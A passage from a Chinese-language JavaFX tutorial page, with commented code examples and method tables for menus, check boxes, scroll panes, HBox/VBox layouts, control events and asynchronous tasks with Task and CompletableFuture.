javafx.scene.control.CheckMenuItem;// 导入 JavaFX 勾选菜单项（CheckMenuItem）类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建 BorderPane 边界布局容器<br>BorderPane borderPane = new BorderPane();<br><br>MenuBar menuBar = new MenuBar();// 创建 MenuBar 菜单栏<br>borderPane.setTop(menuBar);// 将菜单栏设置在边界布局容器的顶部<br>Menu menu = new Menu(&quot;选项&quot;);// 创建一个主菜单 Menu<br>menuBar.getMenus().addAll(menu);// 向菜单栏添加主菜单<br>Menu menu3 = new Menu(&quot;选择&quot;);// 创建一个子菜单 Menu<br>menu.getItems().addAll(menu3);// 向主菜单添加子菜单<br>// 创建勾选菜单项 CheckMenuItem<br>CheckMenuItem checkMenuItem1 = new CheckMenuItem(&quot;选项1&quot;);<br>CheckMenuItem checkMenuItem2 = new CheckMenuItem(&quot;选项2&quot;);<br>// 向子菜单添加勾选菜单项<br>menu3.getItems().addAll(checkMenuItem1, checkMenuItem2);<br><br>// 创建一个场景对象，并将 BorderPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(borderPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示 GuiDemo 舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="多选-勾选框"><a href="#多选-勾选框" class="headerlink" title="多选-勾选框"></a>多选-勾选框</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.control.CheckBox;// 导入 JavaFX 勾选框（CheckBox）控件类<br>import javafx.scene.layout.VBox;// 导入 JavaFX 垂直布局容器（VBox）类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建勾选框 CheckBox 控件<br>CheckBox checkBox1 = new CheckBox(&quot;选项1&quot;);<br>CheckBox checkBox2 = new CheckBox(&quot;选项2&quot;);<br>CheckBox checkBox3 = new CheckBox(&quot;选项3&quot;);<br><br>// 创建一个垂直布局 VBox，用于容纳勾选框<br>VBox vBox = new VBox(10);  // 设置子控件之间的间距<br>vBox.getChildren().addAll(checkBox1, checkBox2, checkBox3);// 向 AnchorPane 中添加控件<br><br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(vBox, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="滚动条"><a href="#滚动条" class="headerlink" title="滚动条"></a>滚动条</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.collections.FXCollections;// 导入 JavaFX 集合工具类<br>import javafx.scene.control.ListView;// 导入 JavaFX 列表视图控件类<br>import javafx.scene.control.SelectionMode;// 导入 JavaFX 选择模式枚举类<br>import javafx.scene.control.ScrollPane;// 导入 JavaFX 滚动面板控件类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建多选列表视图 ListView 控件<br>ListView&lt;String&gt; listView = new ListView&lt;&gt;();<br>listView.setItems(FXCollections.observableArrayList(&quot;选项1&quot;, &quot;选项2&quot;, &quot;选项3&quot;));<br>listView.setPrefSize(150, 100);  // 设置控件的宽度和高度<br>listView.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);  // 启用多选功能<br><br>// 创建滚动面板 ScrollPane 控件，并将 ListView 放置在其中<br>ScrollPane scrollPane = new ScrollPane(listView);<br>scrollPane.setLayoutX(20);  // 设置横坐标<br>scrollPane.setLayoutY(50);  // 设置纵坐标<br>scrollPane.setPrefSize(150, 100);  // 设置控件的宽度和高度<br><br>AnchorPane anchorPane = new AnchorPane();  // 创建一个 AnchorPane 对象<br>anchorPane.getChildren().addAll(scrollPane);  // 向 AnchorPane 中添加 scrollPane 控件<br>Scene scene = new Scene(anchorPane, 600, 700);  // 创建一个场景对象，将 AnchorPane 添加到场景中，指定场景的宽度和高度<br>GuiDemo.setScene(scene);  // 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.show();  // 显示舞台，使用户界面可见<br></code></pre></td></tr></table></figure><h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><h2 id="水平居中对齐（HBox）"><a href="#水平居中对齐（HBox）" class="headerlink" title="水平居中对齐（HBox）"></a>水平居中对齐（HBox）</h2><h3 id="常用属性-1"><a href="#常用属性-1" class="headerlink" title="常用属性"></a>常用属性</h3><table><thead><tr><th>方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>HBox()</td><td>创建一个空的 <code>HBox</code> 布局。</td><td>HBox hbox &#x3D; new HBox();</td></tr><tr><td>HBox(double spacing)</td><td>创建一个 <code>HBox</code> 布局，其中包含指定间距的子控件。</td><td>HBox hbox &#x3D; new HBox(10);</td></tr><tr><td>getChildren()</td><td>获取 <code>HBox</code> 布局中包含的子控件列表。</td><td>ObservableList<Node> children &#x3D; hbox.getChildren();</Node></td></tr><tr><td>getSpacing()</td><td>获取子控件之间的间距。</td><td>double spacing &#x3D; hbox.getSpacing();</td></tr><tr><td>setSpacing(double value)</td><td>设置子控件之间的间距。</td><td>hbox.setSpacing(10);</td></tr><tr><td>getAlignment()</td><td>获取子控件在 <code>HBox</code> 中的对齐方式。</td><td>Pos alignment &#x3D; hbox.getAlignment();</td></tr><tr><td>setAlignment(Pos value)</td><td>设置子控件在 <code>HBox</code> 中的对齐方式。</td><td>hbox.setAlignment(Pos.CENTER);</td></tr><tr><td>getPadding()</td><td>获取 <code>HBox</code> 的填充，即外边距。</td><td>Insets padding &#x3D; hbox.getPadding();</td></tr><tr><td>setPadding(Insets value)</td><td>设置 <code>HBox</code> 的填充，即外边距。</td><td>hbox.setPadding(new Insets(10, 20, 10, 20));</td></tr><tr><td>isFillHeight(Node child)</td><td>检查指定子控件是否允许在垂直方向上扩展以填充可用空间。</td><td>boolean fillHeight &#x3D; hbox.isFillHeight(child);</td></tr><tr><td>setFillHeight(Node child, boolean value)</td><td>控制指定子控件是否允许在垂直方向上扩展以填充可用空间。</td><td>hbox.setFillHeight(child, true);</td></tr><tr><td>HBox.setMargin(Node child, Insets value)</td><td>设置指定子控件的外边距。</td><td>HBox.setMargin(button, new Insets(10, 20, 10, 20));</td></tr></tbody></table><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.control.Label;    // 导入 JavaFX 标签控件类<br>import javafx.scene.control.TextField; // 导入 JavaFX 文本框控件类<br>import javafx.scene.control.Button;    // 导入 JavaFX 按钮控件类<br>import javafx.geometry.Pos;           // 导入 JavaFX 布局位置类<br>import javafx.scene.layout.HBox;       // 导入 JavaFX 水平布局类<br>import javafx.scene.layout.Region;// 导入 JavaFX 布局类 Region<br>import javafx.geometry.Insets;// 导入 JavaFX 布局外边距类 Insets<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 添加占位 Region 来实现向右移动<br>Region spacer = new Region();<br>spacer.setPrefWidth(30); // 设置占位的宽度，调整这个值以实现所需的偏移量<br><br>// 创建文本<br>Label l = new Label(&quot;文本测试&quot;);// 设置一个lable，用来显示提示文字<br>l.setPrefHeight(27);<br><br>// 创建 URL 输入框<br>TextField urlField = new TextField();<br>urlField.setPrefWidth(200);<br><br>// 创建按钮<br>Button button1 = new Button(&quot;Button 1&quot;);<br>Button button2 = new Button(&quot;Button 2&quot;);<br><br>// 创建水平布局并添加文本、URL输入框和按钮<br>HBox hbox = new HBox(10); // 10像素的间距<br>Insets padding = new Insets(20, 0, 0, 0); // 创建一个Insets对象，指定上、右、下和左方向的填充值<br>HBox.setMargin(urlField, padding);<br>hbox.getChildren().addAll(spacer, l, urlField, button1, button2);<br>// hbox.setAlignment(Pos.TOP_LEFT); // 顶部对齐<br><br>// 创建场景并显示<br>Scene scene = new Scene(hbox, 600, 100);<br>GuiDemo.setScene(scene);<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h2 id="垂直居中（VBox）"><a href="#垂直居中（VBox）" class="headerlink" title="垂直居中（VBox）"></a>垂直居中（VBox）</h2><h3 id="常用属性-2"><a href="#常用属性-2" class="headerlink" title="常用属性"></a>常用属性</h3><table><thead><tr><th>方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>VBox()</td><td>创建一个空的 <code>VBox</code> 布局。</td><td>VBox vbox &#x3D; new VBox();</td></tr><tr><td>VBox(double spacing)</td><td>创建一个 <code>VBox</code> 布局，其中包含指定间距的子控件。</td><td>VBox vbox &#x3D; new VBox(10);</td></tr><tr><td>getChildren()</td><td>获取 <code>VBox</code> 布局中包含的子控件列表。</td><td>ObservableList<Node> children &#x3D; vbox.getChildren();</Node></td></tr><tr><td>getSpacing()</td><td>获取子控件之间的间距。</td><td>double spacing &#x3D; vbox.getSpacing();</td></tr><tr><td>setSpacing(double value)</td><td>设置子控件之间的间距。</td><td>vbox.setSpacing(10);</td></tr><tr><td>getAlignment()</td><td>获取子控件在 <code>VBox</code> 中的对齐方式。</td><td>Pos alignment &#x3D; vbox.getAlignment();</td></tr><tr><td>setAlignment(Pos value)</td><td>设置子控件在 <code>VBox</code> 中的对齐方式。</td><td>vbox.setAlignment(Pos.CENTER);</td></tr><tr><td>getPadding()</td><td>获取 <code>VBox</code> 的填充，即外边距。</td><td>Insets padding &#x3D; vbox.getPadding();</td></tr><tr><td>setPadding(Insets value)</td><td>设置 <code>VBox</code> 的填充，即外边距。</td><td>vbox.setPadding(new Insets(10, 20, 10, 20));</td></tr><tr><td>isFillWidth(Node child)</td><td>检查指定子控件是否允许在水平方向上扩展以填充可用空间。</td><td>boolean fillWidth &#x3D; vbox.isFillWidth(child);</td></tr><tr><td>setFillWidth(Node child, boolean value)</td><td>控制指定子控件是否允许在水平方向上扩展以填充可用空间。</td><td>vbox.setFillWidth(child, true);</td></tr><tr><td>isVgrow(Node child)</td><td>检查指定子控件是否允许在垂直方向上扩展以填充可用空间。</td><td>boolean vgrow &#x3D; vbox.isVgrow(child);</td></tr><tr><td>setVgrow(Node child, Priority value)</td><td>控制指定子控件在垂直方向上的扩展优先级。</td><td>vbox.setVgrow(child, Priority.ALWAYS);</td></tr><tr><td>setFillWidth(Node child, boolean value)</td><td>设置指定子节点的宽度填充属性。</td><td>vbox.setFillWidth(child, true);</td></tr></tbody></table><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.VBox;       // 导入 JavaFX 垂直布局类<br>import javafx.scene.control.Label;      // 导入 JavaFX 标签控件类<br>import javafx.scene.control.TextField;  // 导入 JavaFX 文本框控件类<br>import javafx.scene.control.Button;     // 导入 JavaFX 按钮控件类<br>import javafx.geometry.Pos;             // 导入 JavaFX 布局位置类<br>import javafx.geometry.Insets;// 导入 JavaFX 布局外边距类 Insets<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建标签<br>Label labelText = new Label(&quot;Enter URL:&quot;);<br>labelText.setStyle(&quot;-fx-font-size: 16;&quot;);<br><br>// 创建文本框<br>TextField urlField = new TextField();<br>urlField.setPrefWidth(200);<br><br>// 创建按钮<br>Button button1 = new Button(&quot;Button 1&quot;);<br>Button button2 = new Button(&quot;Button 2&quot;);<br><br>// 创建垂直布局并添加标签、文本框和按钮<br>VBox vbox = new VBox(10); // 10像素的间距<br>// 添加外边距以向下移动<br>Insets padding = new Insets(20, 0, 0, 0); // 创建一个Insets对象，指定上、右、下和左方向的填充值<br>vbox.setPadding(padding);<br>vbox.getChildren().addAll(labelText, urlField, button1, button2);<br>//        vbox.setAlignment(Pos.CENTER); // 垂直居中对齐<br><br>// 创建场景并显示<br>Scene scene = new Scene(vbox, 400, 200);<br>GuiDemo.setScene(scene);<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><h2 id="文本框-1"><a href="#文本框-1" class="headerlink" title="文本框"></a>文本框</h2><table><thead><tr><th>事件&#x2F;方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>textArea.clear()</td><td>清除文本框中的文本。</td><td>textArea.clear();</td></tr><tr><td>textArea.cut()</td><td>剪切当前选择的文本（将其复制到剪贴板并删除）。</td><td>textArea.cut();</td></tr><tr><td>textArea.deleteText(int start, int end)</td><td>删除指定范围内的文本。</td><td>textArea.deleteText(5, 10);</td></tr><tr><td>textArea.getText()</td><td>获取文本框的当前文本内容。</td><td>String content &#x3D; textArea.getText();</td></tr><tr><td>textArea.getSelectedText()</td><td>获取当前选择的文本。</td><td>String selectedText &#x3D; textArea.getSelectedText();</td></tr><tr><td>textArea.insertText(int pos, String text)</td><td>在指定位置插入文本。</td><td>textArea.insertText(10, “Inserted”);</td></tr><tr><td>textArea.lengthProperty()</td><td>获取文本框中的文本长度属性（只读）。</td><td>ReadOnlyIntegerProperty lengthProperty &#x3D; textArea.lengthProperty();</td></tr><tr><td>textArea.paste()</td><td>从剪贴板中粘贴文本。</td><td>textArea.paste();</td></tr><tr><td>textArea.positionCaret(int pos)</td><td>设置文本光标的位置。</td><td>textArea.positionCaret(5);</td></tr><tr><td>textArea.positionCaret(int row, int column)</td><td>设置文本光标的位置，使用行和列索引。</td><td>textArea.positionCaret(2, 10);</td></tr><tr><td>textArea.redo()</td><td>重做最后的文本操作。</td><td>textArea.redo();</td></tr><tr><td>textArea.replaceSelection(String replacement)</td><td>将当前选择的文本替换为指定的字符串。</td><td>textArea.replaceSelection(“Replaced text”);</td></tr><tr><td>textArea.replaceText(int start, int end, String replacement)</td><td>替换指定范围内的文本为指定的字符串。</td><td>textArea.replaceText(5, 10, “Replaced text”);</td></tr><tr><td>textArea.selectAll()</td><td>选择文本框中的所有文本。</td><td>textArea.selectAll();</td></tr><tr><td>textArea.setText(String text)</td><td>设置文本框的文本内容。</td><td>textArea.setText(“Hello, World!”);</td></tr><tr><td>textArea.setOnKeyReleased(eventHandler)</td><td>设置键盘按键释放时的事件处理器。</td><td>textArea.setOnKeyReleased(e -&gt; { &#x2F;* 处理释放按键事件 *&#x2F; });</td></tr><tr><td>textArea.setOnKeyTyped(eventHandler)</td><td>设置键盘按键被键入时的事件处理器。</td><td>textArea.setOnKeyTyped(e -&gt; { &#x2F;* 处理键入按键事件 *&#x2F; });</td></tr><tr><td>textArea.setOnKeyPressed(eventHandler)</td><td>设置键盘按键按下时的事件处理器。</td><td>textArea.setOnKeyPressed(e -&gt; { &#x2F;* 处理按下按键事件 *&#x2F; });</td></tr><tr><td>textArea.setOnMouseDragged(eventHandler)</td><td>设置鼠标拖动事件处理器。</td><td>textArea.setOnMouseDragged(e -&gt; { &#x2F;* 处理鼠标拖动事件 *&#x2F; });</td></tr><tr><td>textArea.setOnMousePressed(eventHandler)</td><td>设置鼠标按键按下时的事件处理器。</td><td>textArea.setOnMousePressed(e -&gt; { &#x2F;* 处理鼠标按下事件 *&#x2F; });</td></tr><tr><td>textArea.setOnMouseReleased(eventHandler)</td><td>设置鼠标按键释放时的事件处理器。</td><td>textArea.setOnMouseReleased(e -&gt; { &#x2F;* 处理鼠标释放事件 *&#x2F; });</td></tr><tr><td>textArea.selectRange(int start, int end)</td><td>选择指定范围内的文本。</td><td>textArea.selectRange(5, 15);</td></tr><tr><td>textArea.undo()</td><td>撤销最后的文本操作。</td><td>textArea.undo();</td></tr></tbody></table><h2 id="按钮-1"><a href="#按钮-1" class="headerlink" title="按钮"></a>按钮</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 添加功能<br>button.setOnAction(event -&gt; &#123;<br>// 内容<br>&#125;);<br></code></pre></td></tr></table></figure><table><thead><tr><th>事件&#x2F;方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>button.setOnAction(eventHandler)</td><td>当按钮被点击时触发事件处理程序</td><td>button.setOnAction(e -&gt; { … });</td></tr><tr><td>button.setText(text)</td><td>设置按钮上的文本</td><td>button.setText(“Click Me”);</td></tr><tr><td>button.setGraphic(Node)</td><td>设置按钮上的图形或图标</td><td>button.setGraphic(new ImageView(image));</td></tr><tr><td>button.setDefaultButton(true)</td><td>将按钮设置为默认按钮，可通过 Enter 键触发点击事件</td><td>button.setDefaultButton(true);</td></tr><tr><td>button.setCancelButton(true)</td><td>将按钮设置为取消按钮，可通过 ESC 键触发点击事件</td><td>button.setCancelButton(true);</td></tr><tr><td>button.setDisable(true)</td><td>禁用按钮，使其不可点击</td><td>button.setDisable(true);</td></tr><tr><td>button.setLayoutX(x)</td><td>设置按钮的横坐标</td><td>button.setLayoutX(100);</td></tr><tr><td>button.setLayoutY(y)</td><td>设置按钮的纵坐标</td><td>button.setLayoutY(50);</td></tr><tr><td>button.setPrefWidth(width)</td><td>设置按钮的宽度</td><td>button.setPrefWidth(120);</td></tr></tbody></table><h2 id="下拉选项-按钮"><a href="#下拉选项-按钮" class="headerlink" title="下拉选项-按钮"></a>下拉选项-按钮</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">comboBox.setOnAction(event -&gt; &#123;<br>            // 内容<br>        &#125;);<br></code></pre></td></tr></table></figure><table><thead><tr><th>事件&#x2F;方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>comboBox.getItems()</td><td>获取 ComboBox 中的选项列表。</td><td><code>ObservableList&lt;String&gt; items = comboBox.getItems();</code></td></tr><tr><td>comboBox.getSelectionModel().select(index)</td><td>选择 ComboBox 中的特定索引项。</td><td><code>comboBox.getSelectionModel().select(2);</code></td></tr><tr><td>comboBox.getSelectionModel().getSelectedItem()</td><td>获取当前选中的项。</td><td><code>String selected = comboBox.getSelectionModel().getSelectedItem();</code></td></tr><tr><td>comboBox.setOnAction(eventHandler)</td><td>设置当选中项发生变化时触发的事件处理器。</td><td><code>comboBox.setOnAction(e -&gt; &#123; ... &#125;);</code></td></tr><tr><td>comboBox.setOnHidden(eventHandler)</td><td>设置下拉选项列表关闭时触发的事件处理器。</td><td><code>comboBox.setOnHidden(e -&gt; &#123; ... &#125;);</code></td></tr><tr><td>comboBox.setOnShowing(eventHandler)</td><td>设置下拉选项列表打开时触发的事件处理器。</td><td><code>comboBox.setOnShowing(e -&gt; &#123; ... &#125;);</code></td></tr><tr><td>comboBox.setButtonCell(cell)</td><td>自定义下拉按钮上显示的内容。</td><td><code>comboBox.setButtonCell(new ListCell&lt;String&gt;() &#123; ... &#125;);</code></td></tr><tr><td>comboBox.setCellFactory(factory)</td><td>自定义下拉选项列表中的每个项的显示方式。</td><td><code>comboBox.setCellFactory(new Callback&lt;ListView&lt;String&gt;, ListCell&lt;String&gt;&gt;() &#123; ... &#125;);</code></td></tr></tbody></table><h2 id="多选-勾选框-1"><a href="#多选-勾选框-1" class="headerlink" title="多选-勾选框"></a>多选-勾选框</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">menu3.setOnAction(event -&gt; &#123;<br>            // 内容<br>        &#125;);<br></code></pre></td></tr></table></figure><table><thead><tr><th>事件&#x2F;方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>menu3.getItems()</td><td>获取子菜单 <code>menu3</code> 中的所有菜单项。</td><td>ObservableList<MenuItem> items &#x3D; menu3.getItems();</MenuItem></td></tr><tr><td>checkMenuItem1.setOnAction(eventHandler)</td><td>设置勾选菜单项 <code>checkMenuItem1</code> 被点击时的事件处理器。</td><td>checkMenuItem1.setOnAction(e -&gt; { … });</td></tr><tr><td>checkMenuItem2.setOnAction(eventHandler)</td><td>设置勾选菜单项 <code>checkMenuItem2</code> 被点击时的事件处理器。</td><td>checkMenuItem2.setOnAction(e -&gt; { … });</td></tr></tbody></table><h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h1><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.application.Application;<br>import javafx.concurrent.Task;<br>import javafx.scene.Scene;<br>import javafx.scene.control.Button;<br>import javafx.scene.control.Label;<br>import javafx.scene.layout.VBox;<br>import javafx.stage.Stage;<br><br>public class Test extends Application &#123;<br><br>    @Override<br>    public void start(Stage primaryStage) &#123;<br>        primaryStage.setTitle(&quot;JavaFX Async Example&quot;);<br><br>        // 创建标签用于显示任务状态<br>        Label statusLabel = new Label(&quot;Status: &quot;);<br>        // 创建按钮用于触发异步任务<br>        Button startButton = new Button(&quot;Start Async Task&quot;);<br><br>        startButton.setOnAction(event -&gt; &#123;<br>            // 禁用按钮以防止多次触发任务<br>            startButton.setDisable(true);<br>            // 更新标签文本以显示任务运行状态<br>            statusLabel.setText(&quot;Status: Running...&quot;);<br><br>            // 创建一个异步任务<br>            Task&lt;String&gt; task = new Task&lt;String&gt;() &#123;<br>                @Override<br>                protected String call() throws Exception &#123;<br>                    // 在后台线程中执行耗时操作，此处模拟一个耗时任务<br>                    Thread.sleep(2000);<br>                    return &quot;Async task completed!&quot;;<br>                &#125;<br>            &#125;;<br><br>            // 当任务完成时更新UI<br>            task.setOnSucceeded(e -&gt; &#123;<br>                // 更新标签以显示任务完成状态<br>                statusLabel.setText(&quot;Status: &quot; + task.getValue());<br>                // 启用按钮以允许再次触发任务<br>                startButton.setDisable(false);<br>            &#125;);<br><br>            // 启动任务的线程<br>            new Thread(task).start();<br>        &#125;);<br><br>        // 创建JavaFX布局<br>        VBox root = new VBox(10);<br>        root.getChildren().addAll(statusLabel, startButton);<br><br>        // 创建JavaFX场景并设置到主舞台<br>        Scene scene = new Scene(root, 300, 100);<br>        primaryStage.setScene(scene);<br>        primaryStage.show();<br>    &#125;<br><br>    public static void main(String[] args) &#123;<br>        launch(args); // 启动JavaFX应用程序<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CompletableFuture"><a href="#CompletableFuture" class="headerlink" title="CompletableFuture"></a>CompletableFuture</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.application.Application;<br>import javafx.application.Platform;<br>import javafx.scene.Scene;<br>import javafx.scene.control.Button;<br>import javafx.scene.control.Label;<br>import javafx.scene.layout.VBox;<br>import javafx.stage.Stage;<br><br>import java.util.concurrent.CompletableFuture;<br><br>public class Test extends Application &#123;<br><br>    @Override<br>    public void start(Stage primaryStage) &#123;<br>        primaryStage.setTitle(&quot;JavaFX Async Example&quot;);<br><br>        Label statusLabel = new Label(&quot;Status: &quot;);<br>        Button startButton = new Button(&quot;Start Async Task&quot;);<br><br>        startButton.setOnAction(event -&gt; &#123;<br>            startButton.setDisable(true);<br>            statusLabel.setText(&quot;Status: Running...&quot;);<br><br>            // 创建一个CompletableFuture来执行异步任务<br>            CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; &#123;<br>                // 模拟一个耗时操作<br>                try &#123;<br>                    Thread.sleep(2000);<br>                &#125; catch (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                return &quot;Async task completed!&quot;;<br>            &#125;);<br><br>            // 当任务完成时更新UI<br>            future.thenAccept(result -&gt; &#123;<br>                Platform.runLater(() -&gt; &#123;  // 使用Platform.runLater确保UI更新在JavaFX主线程中执行<br>                    statusLabel.setText(&quot;Status: &quot; + result);<br>                    startButton.setDisable(false);<br>                &#125;);<br>            &#125;);<br>        &#125;);<br><br>        VBox root = new VBox(10);<br>        root.getChildren().addAll(statusLabel, 